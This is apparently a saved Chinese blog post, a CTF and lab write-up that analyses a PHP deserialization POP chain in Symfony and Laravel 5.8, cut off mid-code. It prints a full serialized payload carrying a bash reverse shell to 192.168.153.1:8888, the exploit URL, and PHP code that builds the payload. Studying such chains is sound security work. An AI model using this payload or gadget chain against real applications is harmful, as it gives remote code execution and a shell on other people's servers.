@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>Laravel POP链简析 | Math &amp; Sec ，HACHp1的个人博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Laravel POP链简析   Laravel POP链简析  前言 基本概念 0x00 Symfony POP链  复现 POP链跟踪  0x01 Laravel 5.8 POP链  复现 POP链分析  总结 参考资料    前言  POP链与PHP反序列化漏洞利用是密不可分的概念，反序列化漏洞相关的知识在网上有很多，这里不再赘述。本文主要对l">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Laravel POP链简析">
+<meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20190906-laravel_pop1.html">
+<meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
+<meta property="og:description" content="Laravel POP链简析   Laravel POP链简析  前言 基本概念 0x00 Symfony POP链  复现 POP链跟踪  0x01 Laravel 5.8 POP链  复现 POP链分析  总结 参考资料    前言  POP链与PHP反序列化漏洞利用是密不可分的概念，反序列化漏洞相关的知识在网上有很多，这里不再赘述。本文主要对l">
+<meta property="og:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
+<meta property="og:updated_time" content="2021-10-29T11:39:31.411Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Laravel POP链简析">
+<meta name="twitter:description" content="Laravel POP链简析   Laravel POP链简析  前言 基本概念 0x00 Symfony POP链  复现 POP链跟踪  0x01 Laravel 5.8 POP链  复现 POP链分析  总结 参考资料    前言  POP链与PHP反序列化漏洞利用是密不可分的概念，反序列化漏洞相关的知识在网上有很多，这里不再赘述。本文主要对l">
+<meta name="twitter:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
+    
+
+    
+
+    
+        <link rel="icon" href="/css/images/favicon.png" />
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/open-sans/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+    
+    
+    
+
+
+</head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">Math &amp; Sec ，HACHp1的个人博客</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/.">主页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/categories">目录</a>
+                
+                    <a class="main-nav-link" href="/tags">标签</a>
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+                
+                <nav id="sub-nav">
+                    <div class="profile" id="profile-nav">
+                        <a id="profile-anchor" href="javascript:;">
+                            <img class="avatar" src="/css/images/avatar.png" />
+                            <i class="fa fa-caret-down"></i>
+                        </a>
+                    </div>
+                </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/.">主页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">目录</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">标签</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+                
+
+<aside id="profile">
+    <div class="inner profile-inner">
+        <div class="base-info profile-block">
+            <img id="avatar" src="/css/images/avatar.png" />
+            <h2 id="name">HACHp1</h2>
+            <h3 id="title">生活少有按照行动而改变，那就抓住那几个少有的。</h3>
+            <span id="location"><i class="fa fa-map-marker"></i>China</span>
+            <a id="follow" target="_blank" href="https://github.com/hachp1">关注我</a>
+        </div>
+        <div class="article-info profile-block">
+            <div class="article-info-block">
+                40
+                <span>文章</span>
+            </div>
+            <div class="article-info-block">
+                8
+                <span>标签</span>
+            </div>
+        </div>
+        
+        <div class="profile-block social-links">
+            <table>
+                <tr>
+                    
+                    
+                    <td>
+                        <a href="https://github.com/HACHp1" target="_blank" title="GitHub" class=tooltip>
+                            <i class="fa fa-GitHub"></i>
+                        </a>
+                    </td>
+                    
+                </tr>
+            </table>
+        </div>
+        
+    </div>
+</aside>
+
+            
+            <section id="main"><article id="post-Laravel-POP链简析" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+    
+        
+            
+	
+		<img src="http://159.75.52.53/img/banner/paris.jpg" class="article-banner" />
+	
+
+
+
+        
+        
+        
+        
+        
+        
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+            Laravel POP链简析
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/posts/Web安全/20190906-laravel_pop1.html">
+            <time datetime="2019-09-06T11:51:37.000Z" itemprop="datePublished">2019-09-06</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/Web安全/">Web安全</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/Web安全/">Web安全</a>
+    </div>
+
+                    </div>
+                
+            </header>
+                
+            
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+			<h1 id="laravel-pop链简析">Laravel POP链简析</h1>
+<!-- TOC -->
+<ul>
+<li><a href="#laravel-pop链简析">Laravel POP链简析</a>
+<ul>
+<li><a href="#前言">前言</a></li>
+<li><a href="#基本概念">基本概念</a></li>
+<li><a href="#0x00-symfony-pop链">0x00 Symfony POP链</a>
+<ul>
+<li><a href="#复现">复现</a></li>
+<li><a href="#pop链跟踪">POP链跟踪</a></li>
+</ul></li>
+<li><a href="#0x01-laravel-58-pop链">0x01 Laravel 5.8 POP链</a>
+<ul>
+<li><a href="#复现-1">复现</a></li>
+<li><a href="#pop链分析">POP链分析</a></li>
+</ul></li>
+<li><a href="#总结">总结</a></li>
+<li><a href="#参考资料">参考资料</a></li>
+</ul></li>
+</ul>
+<!-- /TOC -->
+<h2 id="前言">前言</h2>
+<ul>
+<li>POP链与PHP反序列化漏洞利用是密不可分的概念，反序列化漏洞相关的知识在网上有很多，这里不再赘述。本文主要对laravel的POP链简析。</li>
+</ul>
+<a id="more"></a>
+<h2 id="基本概念">基本概念</h2>
+<ul>
+<li>POP（Property Oriented Programming）：面向属性编程；可以与ROP类比。</li>
+<li>POP链（POP CHAIN）：把魔术方法作为入口，然后在魔术方法中调用其他函数，通过寻找一系列函数，最后执行恶意代码，就构成了POP CHAIN 。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制反序列化的类的属性，从而执行POP CHAIN，达到利用特定漏洞的效果。</li>
+<li>在构造POP链时，攻击者可以控制流程中的所有形如<strong>this-&gt;xxx</strong>的变量和相关函数。</li>
+</ul>
+<h2 id="x00-symfony-pop链">0x00 Symfony POP链</h2>
+<ul>
+<li>此POP chain出现在2019年国赛决赛的一道web题中（原题因为出题人忘记清除访问记录导致POP链暴露，题被刷爆了XD），在laravel 5.8并且安装有symfony组件时存在POP链。</li>
+</ul>
+<h3 id="复现">复现</h3>
+<ul>
+<li>glzjin师傅将题目上传了，题目地址：https://github.com/glzjin/CISCN_2019_Final_9_Day1_Web4</li>
+<li><p>为了调试漏洞，我在复现时使用上一篇<a href="https://hachp1.github.io/posts/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20190903-php7_xdebug.html">博客</a>中的docker，然后直接将source.tar.gz复制解压就搭建好可以调试的环境了。</p></li>
+<li><p>整个POP链的官方payload如下（在后面会有一些简化，payload与此处不大一致）：</p></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bi%3A1%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A3%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A53%3A%22bash%20-c%20&apos;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.153.1%2F8888%200%3E%261&apos;%22%3Bs%3A11%3A%22%00%2A%00poolHash%22%3Bs%3A1%3A%221%22%3Bs%3A9%3A%22%00%2A%00expiry%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A2%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3Bs%3A54%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00poolHash%22%3Bs%3A1%3A%221%22%3B%7D%7D</div></pre></td></tr></table></figure>
+<ul>
+<li>构造的对象内容如下（中间的%00不能复制，替换成了%20）：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">O:47:&quot;Symfony\Component\Cache\Adapter\TagAwareAdapter&quot;:2:</div><div class="line">&#123;</div><div class="line"></div><div class="line">    s:57:&quot; Symfony\Component\Cache\Adapter\TagAwareAdapter deferred&quot;;</div><div class="line">    a:1:</div><div class="line">    &#123;</div><div class="line">        i:1;</div><div class="line">        O:33:&quot;Symfony\Component\Cache\CacheItem&quot;:3:</div><div class="line">        &#123;</div><div class="line">            s:12:&quot; * innerItem&quot;;</div><div class="line">            s:53:&quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/192.168.153.1/8888 0&gt;&amp;1&apos;&quot;;</div><div class="line">            </div><div class="line">            s:11:&quot; * poolHash&quot;;</div><div class="line">            s:1:&quot;1&quot;;</div><div class="line">            </div><div class="line">            s:9:&quot; * expiry&quot;;</div><div class="line">            s:1:&quot;1&quot;;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    s:53:&quot;Symfony\Component\Cache\Adapter\TagAwareAdapter pool&quot;;</div><div class="line">    O:44:&quot;Symfony\Component\Cache\Adapter\ProxyAdapter&quot;:2:</div><div class="line">    &#123;  </div><div class="line">        s:58:&quot;Symfony\Component\Cache\Adapter\ProxyAdapter setInnerItem&quot;;</div><div class="line">        s:6:&quot;system&quot;;</div><div class="line">        </div><div class="line">        s:54:&quot;Symfony\Component\Cache\Adapter\ProxyAdapter poolHash&quot;;</div><div class="line">        s:1:&quot;1&quot;;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>访问： <code>http://192.168.153.128:10086/public/?payload=O%3A47%3A%22Symfony\Component\Cache\Adapter\TagAwareAdapter%22%3A2%3A{s%3A57%3A%22%00Symfony\Component\Cache\Adapter\TagAwareAdapter%00deferred%22%3Ba%3A1%3A{i%3A1%3BO%3A33%3A%22Symfony\Component\Cache\CacheItem%22%3A3%3A{s%3A12%3A%22%00*%00innerItem%22%3Bs%3A53%3A%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.153.1%2F8888%200%3E%261%27%22%3Bs%3A11%3A%22%00*%00poolHash%22%3Bs%3A1%3A%221%22%3Bs%3A9%3A%22%00*%00expiry%22%3Bs%3A1%3A%221%22%3B}}s%3A53%3A%22%00Symfony\Component\Cache\Adapter\TagAwareAdapter%00pool%22%3BO%3A44%3A%22Symfony\Component\Cache\Adapter\ProxyAdapter%22%3A2%3A{s%3A58%3A%22%00Symfony\Component\Cache\Adapter\ProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3Bs%3A54%3A%22%00Symfony\Component\Cache\Adapter\ProxyAdapter%00poolHash%22%3Bs%3A1%3A%221%22%3B}}</code> 即可反弹shell。</li>
+</ul>
+<h3 id="pop链跟踪">POP链跟踪</h3>
+<ul>
+<li>在进行POP链跟踪时，我尝试从构造者的角度进行解析，分析在实战中如何找到POP链。</li>
+</ul>
+<p>首先，全局找出一个可以利用的魔术方法（实际寻找时，需要挨个查看，并每个深入分析），发现在 <code>vendor\symfony\symfony\src\Symfony\Component\Cache\Adapter\TagAwareAdapter.php</code> 中包含一个__destruct：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;commit();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>跟进：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;invalidateTags([]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>跟进，由于构造了deferred，在第125行会按照deferred逐个调用，进入saveDeferred函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalidateTags</span><span class="params">(array $tags)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $ok = <span class="keyword">true</span>;</div><div class="line">        $tagsByKey = [];</div><div class="line">        $invalidatedTags = [];</div><div class="line">        <span class="keyword">foreach</span> ($tags <span class="keyword">as</span> $tag) &#123;</div><div class="line">            CacheItem::validateKey($tag);</div><div class="line">            $invalidatedTags[$tag] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</div><div class="line">            $items = <span class="keyword">$this</span>-&gt;deferred;</div><div class="line">            <span class="keyword">foreach</span> ($items <span class="keyword">as</span> $key =&gt; $item) &#123;</div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item)) &#123; <span class="comment">//跟进这里</span></div><div class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[$key]);</div><div class="line">                    $ok = <span class="keyword">false</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            $f = <span class="keyword">$this</span>-&gt;getTagsByKey;</div><div class="line">            $tagsByKey = $f($items);</div><div class="line">            <span class="keyword">$this</span>-&gt;deferred = [];</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $tagVersions = <span class="keyword">$this</span>-&gt;getTagVersions($tagsByKey, $invalidatedTags);</div><div class="line">        $f = <span class="keyword">$this</span>-&gt;createCacheItem;</div><div class="line"></div><div class="line">        <span class="keyword">foreach</span> ($tagsByKey <span class="keyword">as</span> $key =&gt; $tags) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($f(<span class="keyword">static</span>::TAGS_PREFIX.$key, array_intersect_key($tagVersions, $tags), $items[$key]));</div><div class="line">        &#125;</div><div class="line">        $ok = <span class="keyword">$this</span>-&gt;pool-&gt;commit() &amp;&amp; $ok;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ($invalidatedTags) &#123;</div><div class="line">            $f = <span class="keyword">$this</span>-&gt;invalidateTags;</div><div class="line">            $ok = $f(<span class="keyword">$this</span>-&gt;tags, $invalidatedTags) &amp;&amp; $ok;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> $ok;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>在这里需要对 <code>this-&gt;pool</code> 进行构造，全局找到一个类包含 <code>saveDeferred</code> 函数并且能够被利用；经过一番寻找，发现在 <code>vendor\symfony\symfony\src\Symfony\Component\Cache\Adapter\ProxyAdapter.php</code> 中存在可以利用的类（在实际寻找中，需要跟进到执行命令那一步才能确认POP链可用）。</li>
+</ul>
+<p>跟进到 <code>ProxyAdapter.php</code> 中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span><span class="params">(CacheItemInterface $item)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;doSave($item, <span class="keyword">__FUNCTION__</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>继续跟进，在223行调用了 <code>($this-&gt;setInnerItem)($innerItem, $item)</code> （注：此语法是php7.1之后某版本的新语法，在旧版本中不能成功执行）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">doSave</span><span class="params">(CacheItemInterface $item, $method)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (!$item <span class="keyword">instanceof</span> CacheItem) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">    $item = (<span class="keyword">array</span>) $item;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> === $item[<span class="string">"\0*\0expiry"</span>] &amp;&amp; <span class="number">0</span> &lt; $item[<span class="string">"\0*\0defaultLifetime"</span>]) &#123;</div><div class="line">        $item[<span class="string">"\0*\0expiry"</span>] = microtime(<span class="keyword">true</span>) + $item[<span class="string">"\0*\0defaultLifetime"</span>];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($item[<span class="string">"\0*\0poolHash"</span>] === <span class="keyword">$this</span>-&gt;poolHash &amp;&amp; $item[<span class="string">"\0*\0innerItem"</span>]) &#123;</div><div class="line">        $innerItem = $item[<span class="string">"\0*\0innerItem"</span>];</div><div class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;pool <span class="keyword">instanceof</span> AdapterInterface) &#123;</div><div class="line">        <span class="comment">// this is an optimization specific for AdapterInterface implementations</span></div><div class="line">        <span class="comment">// so we can save a round-trip to the backend by just creating a new item</span></div><div class="line">        $f = <span class="keyword">$this</span>-&gt;createCacheItem;</div><div class="line">        $innerItem = $f(<span class="keyword">$this</span>-&gt;namespace.$item[<span class="string">"\0*\0key"</span>], <span class="keyword">null</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $innerItem = <span class="keyword">$this</span>-&gt;pool-&gt;getItem(<span class="keyword">$this</span>-&gt;namespace.$item[<span class="string">"\0*\0key"</span>]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    (<span class="keyword">$this</span>-&gt;setInnerItem)($innerItem, $item);<span class="comment">//注意这里</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pool-&gt;$method($innerItem);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>在此处可以动态调用函数， <code>$this-&gt;setInnerItem</code> 值可控，但是 <code>$innerItem</code> 的值不能一眼看出可控， <code>$innerItem</code> 的值有多种赋值方法，实际情况下需要分析后进一步找出如何控制 <code>$innerItem</code> 的值。<br>
+</li>
+<li>注意到如下：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ($item[<span class="string">"\0*\0poolHash"</span>] === <span class="keyword">$this</span>-&gt;poolHash &amp;&amp; $item[<span class="string">"\0*\0innerItem"</span>]) &#123;</div><div class="line">            $innerItem = $item[<span class="string">"\0*\0innerItem"</span>];</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>回溯到 <code>invalidateTags</code> 函数中，注意到 <code>$items = $this-&gt;deferred;</code> ，而<code>$items</code>会被进一步解析到 <code>$item</code> ，所以此处的 <code>$item</code> 是可控的。在这里，需要使 <code>$item[&quot;\0*\0poolHash&quot;] === $this-&gt;poolHash &amp;&amp; $item[&quot;\0*\0innerItem&quot;]</code> ，这是什么意思呢，在PHP中，将一个对象被强行转换为array时，它的属性就会根据其是private或protected变成相应的字符串；所以在这里，还需要两个类的 <code>poolHash</code> 属性，使之相等，这时就能控制动态调用函数的第一个参数了。所以在这里需要在全局找到一个类，它包含有 <code>poolHash</code> 属性和 <code>innerItem</code> 属性；在这里找到的是 <code>vendor\symfony\symfony\src\Symfony\Component\Cache\CacheItem.php</code> 中的 <code>CacheItem</code> 类：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span> <span class="keyword">implements</span> <span class="title">ItemInterface</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">const</span> METADATA_EXPIRY_OFFSET = <span class="number">1527506807</span>;</div><div class="line"></div><div class="line">    <span class="keyword">protected</span> $key;</div><div class="line">    <span class="keyword">protected</span> $value;</div><div class="line">    <span class="keyword">protected</span> $isHit = <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">protected</span> $expiry;</div><div class="line">    <span class="keyword">protected</span> $defaultLifetime;</div><div class="line">    <span class="keyword">protected</span> $metadata = [];</div><div class="line">    <span class="keyword">protected</span> $newMetadata = [];</div><div class="line">    <span class="keyword">protected</span> $innerItem;</div><div class="line">    <span class="keyword">protected</span> $poolHash;</div><div class="line">    <span class="keyword">protected</span> $isTaggable = <span class="keyword">false</span>;</div><div class="line">    ......</div></pre></td></tr></table></figure>
+<p>此时我们已经可以做到任意调用一个函数，这个函数的第一个参数我们可以控制；这个时候，需要找到一个PHP命令执行函数，它可以有两个参数，并且只需要第一个参数就能达到RCE的效果。</p>
+<ul>
+<li>查看system函数的文档：</li>
+</ul>
+<p><code>system ( string $command [, int &amp;$return_var ] ) : string</code> ，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。传入两个参数是可以成功调用的。</p>
+<ul>
+<li>综合起来，控制函数名为 <code>system</code> ，第一个参数为待执行的函数，就可以执行系统命令。设置 <code>$this-&gt;setInnerItem</code> 的值为 <code>system</code> ， <code>$innerItem</code> 值为待执行的命令，从而执行了任意指令，达到RCE的目的。</li>
+</ul>
+<p>简化之后的payload构造代码如下（修改自<a href="https://xz.aliyun.com/t/5911#toc-2" target="_blank" rel="external">mochazz师傅的构造代码</a>）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</div><div class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span></div><div class="line">    &#123;</div><div class="line">        <span class="title">protected</span> $<span class="title">poolHash</span>;</div><div class="line">        <span class="keyword">protected</span> $innerItem;</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">( $poolHash, $command)</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</div><div class="line">            <span class="keyword">$this</span>-&gt;innerItem = $command;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</div><div class="line">    <span class="title">class</span> <span class="title">ProxyAdapter</span></div><div class="line">    &#123;</div><div class="line">        <span class="title">private</span> $<span class="title">poolHash</span>;</div><div class="line">        <span class="keyword">private</span> $setInnerItem;</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($poolHash, $func)</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</div><div class="line">            <span class="keyword">$this</span>-&gt;setInnerItem = $func;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span></div><div class="line"><span class="class">    </span>&#123;</div><div class="line">        <span class="keyword">private</span> $deferred = [];</div><div class="line">        <span class="keyword">private</span> $pool;</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($deferred, $pool)</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;deferred = $deferred;</div><div class="line">            <span class="keyword">$this</span>-&gt;pool = $pool;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">namespace</span> &#123;</div><div class="line">    $cacheitem = new Symfony\Component\Cache\CacheItem(1,"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.153.1/8888 0&gt;&amp;1'");</div><div class="line">    